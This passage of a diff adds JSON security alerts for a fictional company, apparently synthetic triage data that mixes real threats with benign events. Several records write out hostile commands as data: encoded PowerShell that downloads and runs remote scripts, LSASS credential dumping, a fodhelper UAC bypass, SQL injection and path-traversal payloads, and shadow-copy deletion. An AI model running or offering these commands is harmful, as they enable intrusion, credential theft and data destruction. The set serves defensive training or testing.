+    "dst_ip": "91.240.118.162",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANgAyAC8AYQAuAHAAcwAxACcAKQA=",
+      "parent": "winword.exe",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://91.240.118.162/a.ps1')"
+    }
+  },
+  {
+    "id": "ALR-0060",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS dump on WS-FIN-016",
+    "description": "Process dumped lsass.exe memory on WS-FIN-016 under svc_backup. Command: procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\l.dmp",
+    "timestamp": "2026-10-10T02:59:30Z",
+    "host": "WS-FIN-016",
+    "user": "svc_backup",
+    "process": {
+      "command_line": "procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\l.dmp",
+      "target": "lsass.exe",
+      "access": "0x1FFFFF"
+    }
+  },
+  {
+    "id": "ALR-0061",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Exploit against SRV-WEB01 succeeded",
+    "description": "Request from 45.155.205.128 to SRV-WEB01 with payload '../../../../etc/passwd' returned HTTP 200. Minutes later, a new file shell.aspx appeared in the web root and w3wp.exe spawned cmd.exe.",
+    "timestamp": "2026-10-15T08:24:13Z",
+    "host": "SRV-WEB01",
+    "src_ip": "45.155.205.128",
+    "raw": {
+      "payload": "../../../../etc/passwd",
+      "response_code": 200,
+      "blocked": false,
+      "webshell": "shell.aspx"
+    }
+  },
+  {
+    "id": "ALR-0062",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from SRV-NESSUS01",
+    "description": "SRV-NESSUS01 (10.20.14.21) scanned 254 hosts on 10.20.0.0/16 across 1000 ports. Host is the vulnerability scanner; scan falls in the weekly Tuesday scan window.",
+    "timestamp": "2026-10-19T02:09:47Z",
+    "host": "SRV-NESSUS01",
+    "src_ip": "10.20.14.21",
+    "raw": {
+      "hosts_scanned": 254,
+      "ports": 1000,
+      "scheduled": true
+    }
+  },
+  {
+    "id": "ALR-0063",
+    "source": "edr",
+    "rule_name": "UAC Bypass",
+    "title": "UAC bypass on WS-HR-020",
+    "description": "Registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command set to C:\\Users\\Public\\p.exe, then fodhelper.exe launched it with high integrity on WS-HR-020.",
+    "timestamp": "2026-10-12T04:38:52Z",
+    "host": "WS-HR-020",
+    "user": "kwilliams",
+    "process": {
+      "name": "fodhelper.exe",
+      "child": "C:\\Users\\Public\\p.exe",
+      "integrity": "high"
+    }
+  },
+  {
+    "id": "ALR-0064",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for kwilliams",
+    "description": "User kwilliams signed in from 203.0.113.10 (US) and then from 73.70.105.16 (IN) 39 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-13T00:10:00Z",
+    "user": "kwilliams",
+    "src_ip": "73.70.105.16",
+    "raw": {
+      "first_ip": "203.0.113.10",
+      "second_ip": "73.70.105.16",
+      "minutes_between": 39,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0065",
+    "source": "edr",
+    "rule_name": "PowerShell Execution Policy Bypass",
+    "title": "PowerShell bypass on WS-SALES-016",
+    "description": "PowerShell started with -ExecutionPolicy Bypass on WS-SALES-016 by SYSTEM. Parent: ccmexec.exe (Microsoft SCCM client). Script path is in the SCCM cache.",
+    "timestamp": "2026-10-13T18:46:09Z",
+    "host": "WS-SALES-016",
+    "user": "SYSTEM",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1",
+      "parent": "ccmexec.exe",
+      "signed_parent": true
+    }
+  },
+  {
+    "id": "ALR-0066",
+    "source": "firewall",
+    "rule_name": "Port Scan Detected",
+    "title": "Inbound port scan from 162.142.125.10",
+    "description": "External IP 162.142.125.10 probed 1529 ports on the perimeter firewall in 5 minutes. All connections were dropped.",
+    "timestamp": "2026-10-11T12:07:59Z",
+    "src_ip": "162.142.125.10",
+    "raw": {
+      "ports_probed": 1529,
+      "action": "dropped",
+      "direction": "inbound"
+    }
+  },
+  {
+    "id": "ALR-0067",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Exploit against SRV-WEB01 succeeded",
+    "description": "Request from 185.220.101.11 to SRV-WEB01 with payload \"' OR 1=1 UNION SELECT username,password FROM users--\" returned HTTP 200. Minutes later, a new file shell.aspx appeared in the web root and w3wp.exe spawned cmd.exe.",
+    "timestamp": "2026-10-03T12:24:55Z",
+    "host": "SRV-WEB01",
+    "src_ip": "185.220.101.11",
+    "raw": {
+      "payload": "' OR 1=1 UNION SELECT username,password FROM users--",
+      "response_code": 200,
+      "blocked": false,
+      "webshell": "shell.aspx"
+    }
+  },
+  {
+    "id": "ALR-0068",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against omoore",
+    "description": "64 failed logins for omoore from 73.134.238.63 in 3 minutes.",
+    "timestamp": "2026-10-10T20:59:09Z",
+    "user": "omoore",
+    "src_ip": "73.134.238.63",
+    "dst_host": "SRV-DC02",
+    "raw": {
+      "failed_count": 64,
+      "window_minutes": 3,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0069",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS dump on WS-HR-008",
+    "description": "Process dumped lsass.exe memory on WS-HR-008 under it-admin. Command: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\d.bin full",
+    "timestamp": "2026-10-07T11:50:27Z",
+    "host": "WS-HR-008",
+    "user": "it-admin",
+    "process": {
+      "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\d.bin full",
+      "target": "lsass.exe",
+      "access": "0x1FFFFF"
+    }
+  },
+  {
+    "id": "ALR-0070",
+    "source": "edr",
+    "rule_name": "Unsigned/Rare Binary Executed",
+    "title": "Rare binary on WS-OPS-008",
+    "description": "python_setup.exe executed on WS-OPS-008 by pjackson; binary seen on fewer than 3 hosts in the fleet.",
+    "timestamp": "2026-10-18T17:46:05Z",
+    "host": "WS-OPS-008",
+    "user": "pjackson",
+    "file_hash": "82431888d333649d96e19fdf45d1de2c24f97c9d8507ace637d8e56053102855",
+    "file": {
+      "name": "python_setup.exe",
+      "path": "C:\\Users\\pjackson\\Downloads\\python_setup.exe"
+    },
+    "raw": {
+      "prevalence": 2,
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0071",
+    "source": "edr",
+    "rule_name": "Suspicious Encoded PowerShell",
+    "title": "Encoded PowerShell on WS-SALES-022",
+    "description": "Encoded PowerShell command on WS-SALES-022 by rbrown, parent process winword.exe. Decoded command downloads and executes a script from 45.155.205.127.",
+    "timestamp": "2026-10-20T04:41:55Z",
+    "host": "WS-SALES-022",
+    "user": "rbrown",
+    "dst_ip": "45.155.205.127",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA1ADUALgAyADAANQAuADEAMgA3AC8AYQAuAHAAcwAxACcAKQA=",
+      "parent": "winword.exe",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://45.155.205.127/a.ps1')"
+    }
+  },
+  {
+    "id": "ALR-0072",
+    "source": "okta",
+    "rule_name": "MFA Push Fatigue",
+    "title": "MFA push spam for kwilliams",
+    "description": "kwilliams received 29 MFA push requests in 15 minutes for sign-ins from 91.240.118.162. The user approved the last one.",
+    "timestamp": "2026-10-05T01:30:26Z",
+    "user": "kwilliams",
+    "src_ip": "91.240.118.162",
+    "raw": {
+      "push_count": 29,
+      "approved": true
+    }
+  },
+  {
+    "id": "ALR-0073",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-ENG-015",
+    "description": "WS-ENG-015 sent HTTP POSTs to 45.155.205.102 every 300 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-08T09:30:35Z",
+    "host": "WS-ENG-015",
+    "dst_ip": "45.155.205.102",
+    "raw": {
+      "interval_seconds": 300,
+      "duration_hours": 6,
+      "requests": 72
+    }
+  },
+  {
+    "id": "ALR-0074",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from WS-FIN-016",
+    "description": "Workstation WS-FIN-016 (10.20.11.166) connected to 180 internal hosts on ports 445, 3389, 5985 and 22 in 3 minutes. This host has no history of scanning.",
+    "timestamp": "2026-10-06T02:13:32Z",
+    "host": "WS-FIN-016",
+    "src_ip": "10.20.11.166",
+    "raw": {
+      "hosts_scanned": 180,
+      "ports": [
+        445,
+        3389,
+        5985,
+        22
+      ],
+      "scheduled": false
+    }
+  },
+  {
+    "id": "ALR-0075",
+    "source": "okta",
+    "rule_name": "Password Spray Detected",
+    "title": "Password spray from 91.240.118.163",
+    "description": "Single IP 91.240.118.163 attempted logins against 15 different accounts (1-2 attempts each) in 10 minutes using common passwords.",
+    "timestamp": "2026-10-08T11:16:51Z",
+    "src_ip": "91.240.118.163",
+    "raw": {
+      "targeted_accounts": [
+        "nlee",
+        "dnguyen",
+        "pjackson",
+        "sjohnson",
+        "rbrown",
+        "lchen",
+        "tmartin",
+        "apatel",
+        "mgarcia",
+        "jsmith",
+        "bthompson",
+        "ehernandez",
+        "omoore",
+        "cwhite",
+        "kwilliams"
+      ],
+      "attempts_per_account": "1-2",
+      "successes": []
+    }
+  },
+  {
+    "id": "ALR-0076",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by nlee",
+    "description": "nlee uploaded 1.5 GB to acme-my.sharepoint.com (company-sanctioned SharePoint) from WS-FIN-003 during work hours.",
+    "timestamp": "2026-10-17T17:24:17Z",
+    "user": "nlee",
+    "host": "WS-FIN-003",
+    "raw": {
+      "destination": "acme-my.sharepoint.com",
+      "bytes_out_gb": 1.5,
+      "category": "sanctioned"
+    }
+  },
+  {
+    "id": "ALR-0077",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS access on WS-FIN-008",
+    "description": "MsMpEng.exe (Microsoft Defender, signed) opened a handle to lsass.exe on WS-FIN-008 during a scheduled scan.",
+    "timestamp": "2026-10-16T08:36:23Z",
+    "host": "WS-FIN-008",
+    "user": "SYSTEM",
+    "process": {
+      "name": "MsMpEng.exe",
+      "target": "lsass.exe",
+      "signed": true,
+      "access": "0x1010"
+    }
+  },
+  {
+    "id": "ALR-0078",
+    "source": "okta",
+    "rule_name": "Account Locked Out",
+    "title": "tmartin locked out",
+    "description": "tmartin locked out after 5 failed attempts from their usual device at the office, then self-service unlocked via verified MFA.",
+    "timestamp": "2026-10-17T17:05:17Z",
+    "user": "tmartin"
+  },
+  {
+    "id": "ALR-0079",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Suspicious scheduled task on WS-HR-002",
+    "description": "Task 'OneDriveSync' created on WS-HR-002 running an unsigned binary from AppData at every logon as SYSTEM. Task name imitates a Microsoft component.",
+    "timestamp": "2026-10-21T14:27:19Z",
+    "host": "WS-HR-002",
+    "user": "rbrown",
+    "process": {
+      "command_line": "schtasks /create /tn \"OneDriveSync\" /tr \"C:\\Users\\rbrown\\AppData\\Roaming\\svc\\upd.exe\" /sc onlogon /ru SYSTEM"
+    }
+  },
+  {
+    "id": "ALR-0080",
+    "source": "edr",
+    "rule_name": "PowerShell Execution Policy Bypass",
+    "title": "PowerShell bypass on WS-OPS-016",
+    "description": "PowerShell started with -ExecutionPolicy Bypass on WS-OPS-016 by SYSTEM. Parent: ccmexec.exe (Microsoft SCCM client). Script path is in the SCCM cache.",
+    "timestamp": "2026-10-05T14:27:45Z",
+    "host": "WS-OPS-016",
+    "user": "SYSTEM",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1",
+      "parent": "ccmexec.exe",
+      "signed_parent": true
+    }
+  },
+  {
+    "id": "ALR-0081",
+    "source": "edr",
+    "rule_name": "PowerShell Execution Policy Bypass",
+    "title": "PowerShell bypass on WS-OPS-007",
+    "description": "PowerShell started with -ExecutionPolicy Bypass on WS-OPS-007 by SYSTEM. Parent: ccmexec.exe (Microsoft SCCM client). Script path is in the SCCM cache.",
+    "timestamp": "2026-10-19T21:00:04Z",
+    "host": "WS-OPS-007",
+    "user": "SYSTEM",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1",
+      "parent": "ccmexec.exe",
+      "signed_parent": true
+    }
+  },
+  {
+    "id": "ALR-0082",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against administrator",
+    "description": "167 failed logins for administrator from 185.220.101.23 in 4 minutes.",
+    "timestamp": "2026-10-08T04:09:33Z",
+    "user": "administrator",
+    "src_ip": "185.220.101.23",
+    "dst_host": "SRV-EXCH01",
+    "raw": {
+      "failed_count": 167,
+      "window_minutes": 4,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0083",
+    "source": "edr",
+    "rule_name": "Ransomware Behavior",
+    "title": "Mass file encryption on WS-FIN-014",
+    "description": "2192 files renamed to *.crypt on WS-FIN-014 in 2 minutes. 'vssadmin delete shadows /all /quiet' ran just before. Ransom note README_RESTORE.txt dropped in each folder.",
+    "timestamp": "2026-10-18T01:00:50Z",
+    "host": "WS-FIN-014",
+    "user": "lchen",
+    "raw": {
+      "files_modified": 2192,
+      "new_extension": ".crypt",
+      "shadow_copies_deleted": true
+    }
+  },
+  {
+    "id": "ALR-0084",
+    "source": "edr",
+    "rule_name": "Suspicious Encoded PowerShell",
+    "title": "Encoded PowerShell on WS-OPS-022",
+    "description": "Encoded PowerShell command on WS-OPS-022 by jsmith, parent process winword.exe. Decoded command downloads and executes a script from 194.26.192.62.",
+    "timestamp": "2026-10-21T08:33:40Z",
+    "host": "WS-OPS-022",
+    "user": "jsmith",
+    "dst_ip": "194.26.192.62",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAxADkAMgAuADYAMgAvAGEALgBwAHMAMQAnACkA",
+      "parent": "winword.exe",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://194.26.192.62/a.ps1')"
+    }
+  },
+  {
+    "id": "ALR-0085",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Scheduled task on WS-OPS-002",
+    "description": "Scheduled task GoogleUpdateTaskMachineUA created on WS-OPS-002 by the signed Google Update installer.",
+    "timestamp": "2026-10-04T15:04:19Z",
+    "host": "WS-OPS-002",
+    "user": "SYSTEM",
+    "process": {
+      "command_line": "schtasks /create /tn \"GoogleUpdateTaskMachineUA\" /tr \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua\" /sc hourly"
+    }
+  },
+  {
+    "id": "ALR-0086",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Suspicious scheduled task on WS-SALES-003",
+    "description": "Task 'OneDriveSync' created on WS-SALES-003 running an unsigned binary from AppData at every logon as SYSTEM. Task name imitates a Microsoft component.",
+    "timestamp": "2026-10-13T08:14:50Z",
+    "host": "WS-SALES-003",
+    "user": "apatel",
+    "process": {
+      "command_line": "schtasks /create /tn \"OneDriveSync\" /tr \"C:\\Users\\apatel\\AppData\\Roaming\\svc\\upd.exe\" /sc onlogon /ru SYSTEM"
+    }
+  },
+  {
+    "id": "ALR-0087",
+    "source": "okta",
+    "rule_name": "MFA Push Fatigue",
+    "title": "MFA push spam for ehernandez",
+    "description": "ehernandez received 26 MFA push requests in 15 minutes for sign-ins from 185.220.101.10. The user approved the last one.",
+    "timestamp": "2026-10-09T02:41:53Z",
+    "user": "ehernandez",
+    "src_ip": "185.220.101.10",
+    "raw": {
+      "push_count": 26,
+      "approved": true
+    }
+  },
+  {
+    "id": "ALR-0088",
+    "source": "okta",
+    "rule_name": "Account Locked Out",
+    "title": "tmartin locked out",
+    "description": "tmartin locked out after 5 failed attempts from their usual device at the office, then self-service unlocked via verified MFA.",
+    "timestamp": "2026-10-08T22:15:01Z",
+    "user": "tmartin"
+  },
+  {
+    "id": "ALR-0089",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for omoore",
+    "description": "User omoore signed in from 198.51.100.20 (US) and then from 45.155.205.109 (RU) 11 minutes later. Distance implies travel faster than possible. The second sign-in used a new, unregistered device and MFA was satisfied by a push approval.",
+    "timestamp": "2026-10-01T06:31:56Z",
+    "user": "omoore",
+    "src_ip": "45.155.205.109",
+    "raw": {
+      "first_ip": "198.51.100.20",
+      "second_ip": "45.155.205.109",
+      "minutes_between": 11,
+      "new_device": true
+    }
+  },
+  {
+    "id": "ALR-0090",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against cwhite",
+    "description": "156 failed logins for cwhite from 73.164.46.4 in 3 minutes.",
+    "timestamp": "2026-10-16T01:44:21Z",
+    "user": "cwhite",
+    "src_ip": "73.164.46.4",
+    "raw": {
+      "failed_count": 156,
+      "window_minutes": 3,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0091",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Suspicious scheduled task on WS-ENG-023",
+    "description": "Task 'OneDriveSync' created on WS-ENG-023 running an unsigned binary from AppData at every logon as SYSTEM. Task name imitates a Microsoft component.",
+    "timestamp": "2026-10-13T06:00:51Z",
+    "host": "WS-ENG-023",
+    "user": "bthompson",
+    "process": {
+      "command_line": "schtasks /create /tn \"OneDriveSync\" /tr \"C:\\Users\\bthompson\\AppData\\Roaming\\svc\\upd.exe\" /sc onlogon /ru SYSTEM"
+    }
+  },
+  {
+    "id": "ALR-0092",
+    "source": "windows_security",
+    "rule_name": "Certificate Expiring",
+    "title": "TLS certificate expiring on SRV-WEB01",
+    "description": "TLS certificate for portal.acme.example expires in 9 days.",
+    "timestamp": "2026-10-17T15:13:31Z"
+  },
+  {
+    "id": "ALR-0093",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from SRV-NESSUS01",
+    "description": "SRV-NESSUS01 (10.20.20.198) scanned 254 hosts on 10.20.0.0/16 across 1000 ports. Host is the vulnerability scanner; scan falls in the weekly Tuesday scan window.",
+    "timestamp": "2026-10-07T07:29:14Z",
+    "host": "SRV-NESSUS01",
+    "src_ip": "10.20.20.198",
+    "raw": {
+      "hosts_scanned": 254,
+      "ports": 1000,
+      "scheduled": true
+    }
+  },
+  {
+    "id": "ALR-0094",
+    "source": "edr",
+    "rule_name": "Malicious File Executed",
+    "title": "Malicious process on WS-OPS-018",
+    "description": "scan_doc.exe executed on WS-OPS-018 by kwilliams. AV remediation failed; the process made outbound network connections.",
+    "timestamp": "2026-10-16T13:58:42Z",
+    "host": "WS-OPS-018",
+    "user": "kwilliams",
+    "file_hash": "ec7e85bea77d255f8158f5268deb0d802ffe5f2890cc4eace4626e9756ccedda",
+    "file": {
+      "name": "scan_doc.exe",
+      "path": "C:\\Users\\kwilliams\\AppData\\Local\\Temp\\scan_doc.exe"
+    },
+    "raw": {
+      "action": "remediation_failed",
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0095",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Exploit against SRV-WEB01 succeeded",
+    "description": "Request from 91.240.118.176 to SRV-WEB01 with payload \"' OR 1=1 UNION SELECT username,password FROM users--\" returned HTTP 200. Minutes later, a new file shell.aspx appeared in the web root and w3wp.exe spawned cmd.exe.",
+    "timestamp": "2026-10-02T06:01:38Z",
+    "host": "SRV-WEB01",
+    "src_ip": "91.240.118.176",
+    "raw": {
+      "payload": "' OR 1=1 UNION SELECT username,password FROM users--",
+      "response_code": 200,
+      "blocked": false,
+      "webshell": "shell.aspx"
+    }
+  },
+  {
+    "id": "ALR-0096",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Exploit against SRV-WEB01 succeeded",
+    "description": "Request from 185.220.101.16 to SRV-WEB01 with payload \"' OR 1=1 UNION SELECT username,password FROM users--\" returned HTTP 200. Minutes later, a new file shell.aspx appeared in the web root and w3wp.exe spawned cmd.exe.",
+    "timestamp": "2026-10-15T22:56:20Z",
+    "host": "SRV-WEB01",
+    "src_ip": "185.220.101.16",
+    "raw": {
+      "payload": "' OR 1=1 UNION SELECT username,password FROM users--",
+      "response_code": 200,
+      "blocked": false,
+      "webshell": "shell.aspx"
+    }
+  },
+  {
+    "id": "ALR-0097",
+    "source": "okta",
+    "rule_name": "Multiple Failed Logins",
+    "title": "4 failed logins for lchen",
+    "description": "4 failed logins for lchen from 10.20.12.169 (WS-OPS-024) in 3 minutes, followed by a successful login. Password for lchen was changed 1 day ago.",
+    "timestamp": "2026-10-17T21:02:19Z",
+    "user": "lchen",
+    "src_ip": "10.20.12.169",
+    "host": "WS-OPS-024",
+    "raw": {
+      "failed_count": 4,
+      "window_minutes": 3,
+      "subsequent_success": true,
+      "password_last_changed_days": 1
+    }
+  },
+  {
+    "id": "ALR-0098",
+    "source": "edr",
+    "rule_name": "PowerShell Execution Policy Bypass",
+    "title": "PowerShell bypass on WS-HR-001",
+    "description": "PowerShell started with -ExecutionPolicy Bypass on WS-HR-001 by SYSTEM. Parent: ccmexec.exe (Microsoft SCCM client). Script path is in the SCCM cache.",
+    "timestamp": "2026-10-12T19:28:10Z",
+    "host": "WS-HR-001",
+    "user": "SYSTEM",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1",
+      "parent": "ccmexec.exe",
+      "signed_parent": true
+    }
+  },
+  {
+    "id": "ALR-0099",
+    "source": "okta",
+    "rule_name": "MFA Push Fatigue",
+    "title": "MFA push spam for mgarcia",
+    "description": "mgarcia received 14 MFA push requests in 15 minutes for sign-ins from 185.220.101.10. The user approved the last one.",
+    "timestamp": "2026-10-12T03:56:07Z",
+    "user": "mgarcia",
+    "src_ip": "185.220.101.10",
+    "raw": {
+      "push_count": 14,
+      "approved": true
+    }
+  },
+  {
+    "id": "ALR-0100",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by pjackson",
+    "description": "pjackson uploaded 1.4 GB to acme-my.sharepoint.com (company-sanctioned SharePoint) from WS-ENG-003 during work hours.",
+    "timestamp": "2026-10-10T20:05:03Z",
+    "user": "pjackson",
+    "host": "WS-ENG-003",
+    "raw": {
+      "destination": "acme-my.sharepoint.com",
+      "bytes_out_gb": 1.4,
+      "category": "sanctioned"
+    }
+  },
+  {
+    "id": "ALR-0101",
+    "source": "edr",
+    "rule_name": "Sensor Offline",
+    "title": "EDR sensor offline on WS-ENG-002",
+    "description": "EDR sensor on WS-ENG-002 has not checked in for 3 days. Asset inventory shows the laptop as in repair.",
+    "timestamp": "2026-10-18T21:12:20Z"
+  },
+  {
+    "id": "ALR-0102",
+    "source": "edr",
+    "rule_name": "Suspicious Encoded PowerShell",
+    "title": "Encoded PowerShell on WS-OPS-019",
+    "description": "Encoded PowerShell command on WS-OPS-019 by sjohnson, parent process explorer.exe. Decoded command downloads and executes a script from 185.220.101.13.",
+    "timestamp": "2026-10-21T13:15:51Z",
+    "host": "WS-OPS-019",
+    "user": "sjohnson",
+    "dst_ip": "185.220.101.13",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAzAC8AYQAuAHAAcwAxACcAKQA=",
+      "parent": "explorer.exe",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.13/a.ps1')"
+    }
+  },
+  {
+    "id": "ALR-0103",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from WS-HR-004",
+    "description": "Workstation WS-HR-004 (10.20.3.98) connected to 180 internal hosts on ports 445, 3389, 5985 and 22 in 3 minutes. This host has no history of scanning.",
+    "timestamp": "2026-10-02T14:04:51Z",
+    "host": "WS-HR-004",
+    "src_ip": "10.20.3.98",
+    "raw": {
+      "hosts_scanned": 180,
+      "ports": [
+        445,
+        3389,
+        5985,
+        22
+      ],
+      "scheduled": false
+    }
+  },
+  {
+    "id": "ALR-0104",
+    "source": "windows_security",
+    "rule_name": "External RDP Login",
+    "title": "RDP login to SRV-FILE01 from internet",
+    "description": "Successful RDP (logon type 10) to SRV-FILE01 as svc_backup from external IP 73.122.188.125. RDP is not supposed to be exposed to the internet.",
+    "timestamp": "2026-10-12T08:21:39Z",
+    "host": "SRV-FILE01",
+    "user": "svc_backup",
+    "src_ip": "73.122.188.125",
+    "raw": {
+      "logon_type": 10,
+      "success": true
+    }
+  },
+  {
+    "id": "ALR-0105",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for omoore",
+    "description": "User omoore signed in from 198.51.100.20 (US) and then from 104.28.14.8 (US) 25 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-10T00:46:48Z",
+    "user": "omoore",
+    "src_ip": "104.28.14.8",
+    "raw": {
+      "first_ip": "198.51.100.20",
+      "second_ip": "104.28.14.8",
+      "minutes_between": 25,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0106",
+    "source": "edr",
+    "rule_name": "Ransomware Behavior",
+    "title": "Mass file encryption on WS-SALES-005",
+    "description": "1197 files renamed to *.locked on WS-SALES-005 in 2 minutes. 'vssadmin delete shadows /all /quiet' ran just before. Ransom note README_RESTORE.txt dropped in each folder.",
+    "timestamp": "2026-10-08T03:30:45Z",
+    "host": "WS-SALES-005",
+    "user": "sjohnson",
+    "raw": {
+      "files_modified": 1197,
+      "new_extension": ".locked",
+      "shadow_copies_deleted": true
+    }
+  },
+  {
+    "id": "ALR-0107",
+    "source": "edr",
+    "rule_name": "UAC Bypass",
+    "title": "UAC bypass on WS-OPS-004",
+    "description": "Registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command set to C:\\Users\\Public\\p.exe, then fodhelper.exe launched it with high integrity on WS-OPS-004.",
+    "timestamp": "2026-10-09T13:52:31Z",
+    "host": "WS-OPS-004",
+    "user": "rbrown",
+    "process": {
+      "name": "fodhelper.exe",
+      "child": "C:\\Users\\Public\\p.exe",
+      "integrity": "high"
+    }
+  },
+  {
+    "id": "ALR-0108",
+    "source": "edr",
+    "rule_name": "Malicious File Executed",
+    "title": "Malicious process on WS-HR-016",
+    "description": "update.exe executed on WS-HR-016 by lchen. AV remediation failed; the process made outbound network connections.",
+    "timestamp": "2026-10-11T14:23:50Z",
+    "host": "WS-HR-016",
+    "user": "lchen",
+    "file_hash": "2e5db87f7d6f483a2dfc85bac70da122882a3592cb8e01df1d7e3d61b011a987",
+    "file": {
+      "name": "update.exe",
+      "path": "C:\\Users\\lchen\\AppData\\Local\\Temp\\update.exe"
+    },
+    "raw": {
+      "action": "remediation_failed",
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0109",
+    "source": "edr",
+    "rule_name": "Unsigned/Rare Binary Executed",
+    "title": "Rare binary on WS-FIN-011",
+    "description": "7-zip_setup.exe executed on WS-FIN-011 by tmartin; binary seen on fewer than 3 hosts in the fleet.",
+    "timestamp": "2026-10-08T20:04:41Z",
+    "host": "WS-FIN-011",
+    "user": "tmartin",
+    "file_hash": "ebc19ded733f9388ca3dcef9b5b7111644f8f81b10ddc9fcee3f01bf8fe2c0aa",
+    "file": {
+      "name": "7-zip_setup.exe",
+      "path": "C:\\Users\\tmartin\\Downloads\\7-zip_setup.exe"
+    },
+    "raw": {
+      "prevalence": 2,
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0110",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS access on WS-HR-023",
+    "description": "MsMpEng.exe (Microsoft Defender, signed) opened a handle to lsass.exe on WS-HR-023 during a scheduled scan.",
+    "timestamp": "2026-10-18T10:10:27Z",
+    "host": "WS-HR-023",
+    "user": "SYSTEM",
+    "process": {
+      "name": "MsMpEng.exe",
+      "target": "lsass.exe",
+      "signed": true,
+      "access": "0x1010"
+    }
